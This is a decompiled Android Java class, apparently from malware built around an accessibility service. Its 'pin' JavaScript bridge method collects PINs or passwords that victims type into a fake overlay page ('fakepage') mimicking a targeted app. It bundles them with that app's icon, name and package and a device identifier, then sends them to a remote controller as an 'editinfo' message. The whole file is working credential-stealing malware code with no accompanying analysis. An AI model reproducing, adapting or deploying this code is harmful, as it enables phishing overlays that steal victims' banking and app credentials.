package defpackage;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.util.Base64;
import android.webkit.JavascriptInterface;
import com.mamimobi.AccessService;
import io.nats.client.support.ApiConstants;
import java.io.ByteArrayOutputStream;
import java.lang.ref.WeakReference;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public final class ov {
    public final WeakReference a;

    public ov(pv pvVar) {
        this.a = new WeakReference(pvVar);
    }

    @JavascriptInterface
    public void pin(String str, int i) {
        Context context;
        String str2;
        pv pvVar = (pv) this.a.get();
        if (pvVar == null || (context = pvVar.a) == null || (str2 = pvVar.g) == null) {
            return;
        }
        try {
            JSONObject jSONObject = new JSONObject();
            PackageManager packageManager = context.getPackageManager();
            try {
                Bitmap bitmapE = pv.e(packageManager.getPackageInfo(str2, 0).applicationInfo.loadIcon(packageManager));
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                bitmapE.compress(Bitmap.CompressFormat.PNG, 80, byteArrayOutputStream);
                jSONObject.put("icon", Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2));
            } catch (Exception unused) {
            }
            try {
                jSONObject.put("appName", packageManager.getApplicationLabel(packageManager.getApplicationInfo(str2, 0)));
            } catch (Exception unused2) {
            }
            jSONObject.put("isPasswd", true);
            jSONObject.put("packageName", str2);
            jSONObject.put("resourceName", "fakepage-" + i);
            jSONObject.put("text", str);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(ApiConstants.ID, t40.V(context));
            jSONObject2.put(ApiConstants.ACTION, "editinfo");
            jSONObject2.put(ApiConstants.DATA, jSONObject);
            o71 o71VarF = o71.f(context);
            if (o71VarF.e() != null) {
                jSONObject2.put("clientid", o71VarF.e());
            }
            lm0 lm0Var = o71VarF.e;
            if (lm0Var != null) {
                lm0Var.c(jSONObject2.toString().getBytes());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (i == 2) {
            AccessService.S0.remove(str2);
            pvVar.f();
        }
    }
}
